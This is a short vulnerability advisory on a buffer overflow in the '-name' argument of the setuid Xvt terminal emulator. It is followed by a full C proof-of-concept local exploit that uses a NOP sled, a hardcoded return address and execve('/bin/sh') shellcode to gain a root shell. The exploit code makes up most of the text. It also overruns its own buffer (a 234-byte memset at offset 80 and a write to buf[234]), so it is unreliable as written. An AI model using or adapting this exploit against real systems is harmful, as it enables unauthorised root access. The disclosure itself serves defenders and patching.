source: http://www.securityfocus.com/bid/2955/info

Xvt is a terminal emulator for systems using X11R6. It is often installed setuid/setgid so that it runs with the enhanced privileges required to log user sessions.

Xvt contains a buffer overflow in it's handling of the '-name' argument.

An attacker can exploit this buffer overflow to exploit arbitrary code with the enhanced privileges of Xvt. On some systems Xvt is installed setuid root. This may not be the case for all systems. 

/*

   /usr/bin/X11/xvt overflow proof of concept by cb@t-online.fr.

   tshaw:~$ ./expl
   bash#

*/

#include <stdio.h>
#include <stdlib.h>

int main()

{

    char buf[234];
    int i;

    char code[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";


    for(i=0; i<76; i++)
        buf[i] = 0x41;

    *(long *)&buf[76]=0xbffffab0; /* ret addr */

    memset(buf + 80, 0x90, 234);
    memcpy(buf + 233 - strlen(code), code, strlen(code));

    buf[234] = '\0';

    execl("/usr/bin/X11/xvt", "xvt", "-name", buf, 0);                           

}